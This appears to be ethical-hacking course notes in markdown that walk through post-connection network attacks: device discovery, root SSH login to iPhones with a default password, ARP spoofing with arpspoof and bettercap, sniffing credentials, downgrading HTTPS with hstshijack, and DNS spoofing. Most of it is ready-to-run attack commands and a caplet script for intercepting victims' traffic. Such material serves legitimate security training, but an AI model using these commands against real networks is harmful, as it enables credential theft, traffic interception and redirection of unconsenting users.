# Post Connection Attack:
## Discover devices connected to the same network:
- Discover all devices on the network.
- Display their:
	- IP address
	- MAC address
	- Operating System
	- Open Ports
	- Running services
	- ...etc
	
/24 specify all the IPs availabe in the range. You will get all the connected clients to the same network that you are connected now.
```bash
netdiscover -r 10.02.2.1/24

```

## Gathering Sensitive Info About Connected Devices:
- Huge security scanner.
- From an IP/IP range it can discover:
	- Open ports
	- Running services
	- Connected clients
	- +more
	
For that, type zenmap into your terminal and the GUI will be opened.
```bash
zenmap
```
If some client's port number 22 is opened, you can connect from the kali machine. For apple iphone, the password is "alpine".
```bash
ssh root@192.168.1.12
```
And you will logged in into that device as root.

## ARP Poisoning:
![ARP Spoofing](https://www.thesslstore.com/blog/wp-content/uploads/2021/02/arp0.png)

ARP stands for Address Resolution Protocol.
- Simple protocol used to map IP Address of a machine to its MAC address.

**Why ARP Spoofing is possible:**
- Clients accept responses even if they did not send a request.
- Clients trust responses without any form of verification.

## Intercepting Network Traffic:
ARP Spoofing using ARPSPOOF
- arpspoof tool to run arp spoofing attack
- Simple and reliable
- Ported to most operating systems including Android and IOS.
- Usage is always the same.

Use
```bash
arpspoof -i [interface] -t [clientIP] [gatewayIP]
arpspoof -i [interface] -t [gatewayIP] [clientIP]
```
Like
```bash
arpspoof -i wlan0 -t 192.168.0.171 192.168.0.1
arpspoof -i wlan0 -t 192.168.0.1 192.168.0.171
```
Thus the man in the middle attack is possible. If you check, then you will find that the mac address of the router into your victim machine is changed and the mac address showing is the hacker's mac address. But you can't send request from the hacker machine for linux securite reason. For that, have to enable port forwarding this by executing the command
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

## Bettercap
- Framework to run network attacks
- Can be used to:
	- ARP Spoof targets (redirect the flow of packets)
	- Sniff data (urls, username passwords)
	- Bypass HTTPS
	- Redirect domain requests (DNS Spoofing)
	- Inject code in loaded pages
	- And more!
Use
```bash
bettercap -iface [interface]
```
And you will be entered inside the bettercap tool command. If you type "help", you can notice that only one module named "events.stream" is running.

To get help, you can execute
```bash
help [moduleName]
```
like
```bash
help net.probe
```
### net.probe & net.recon:
To start the net.probe, execute
```bash
net.probe on
```
It will automatically search the connected clients to your network provider with which you are connected now. This execution automatically starts the net.recon. If we again execute this command, we can see all the connected clients in better way
```bash
net.show
```

### arp.spoof
To know more about this module,
```bash
help arp.spoof
```
Like if you want to set true to the "arp.spoof.fullduplex" (if true, both the targets and the gateway will be attacked, otherwise only the target (if the router has ARP spoofing protection in place this will make the attack fail).), execute
```bash
set arp.spoof.fullduplex true
```
srp.spoof.targets: Comma separated list of IP addresses, MAC addresses or aliases to spoof, also supports nmap style IP ranges.
```bash
set arp.spoof.targets 192.168.0.180
```
And then turn on the arp.spoof. Before execute this, check that arp.recon and arp.probe are running.
```bash
arp.spoof on
```

### Capture Passwords, Visited Websites:
Now have to tell to capture all the request and responses coming from the client. To do this, the module "net.sniff" will help.
Execute
```bash
net.sniff on
```
Now check the results are coming on the terminal. Every request will be shown here even login username and password also.
vulnweb.com, http://testhtml5.vulnweb.com/

### Creaing Custom Spoofing Script:
Till now we executed couple of commands for spoofing attack. We can automate this. For this, first open a blank text file and write
```txt
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.0.180
arp.spoof on
net.sniff on
```
And save this file as **spoof.cap** and exit from the bettercap. Now execute the below command to run this
```bash
bettercap -iface wlan0 -caplet spoof.cap
```

### Bypass HTTPS:
**Problem:**
- Data in HTTP is sent as plain text
- A MITM can read and edit requests and responses.
--> not secure

**Solution:**
- Use HTTPS
- HTTPS is an adaptation of HTTP
- Encrypt HTTP using TLS (Transport Layer Security) or SSL (Secure Sockets Layer).

**Problem:**
- Most websites use HTTPS
--> Sniffed data will be encrypted

**Solution:**
- Downgrade HTTPS to HTTP

When turn on the sniff using "net.sniff on" execute
```bash
set net.sniff.local true
net.sniff on
```
Or store this to the file where commands are written to automate the bettercap. To list all the caplets
```bash
caplets.show
```
Here I am using "hstshijack/hstshijack" caplet. So
```bash
hstshijack/hstshijack
```

## DNS Spoofing:
```bash
service apache2 start
```
Now if you browse your ip, you can see the apache default website which is in "/var/www/html/".
```bash
bettercap -iface wlan0 -caplet /root/spoof.cap
```
Inside the "spoof.cap" file, the bettercap commands are present. Now to know more about "dns.spoof" module, execute
```bash
help dns.spoof
```
To change the values,
```bash
set dns.spoof.all true
set dns.spoof.domains zsecurity.org,*.zsecurity.org
```
Now start the dns
```bash
dns.spoof on
```
All websites works without only HSTS websites.
